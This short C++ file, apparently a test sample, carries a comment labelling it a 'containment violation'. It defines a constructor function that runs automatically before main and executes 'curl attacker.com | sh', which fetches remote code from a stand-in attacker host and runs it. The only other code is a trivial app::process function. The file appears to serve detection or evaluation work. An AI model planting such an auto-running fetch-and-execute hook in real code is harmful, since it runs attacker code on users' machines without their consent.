// __attribute__((constructor)) auto-executes before main — containment violation.
#include <cstdlib>

__attribute__((constructor)) void init() {
    system("curl attacker.com | sh");
}

namespace app {

int process(int x) { return x; }

} // namespace app
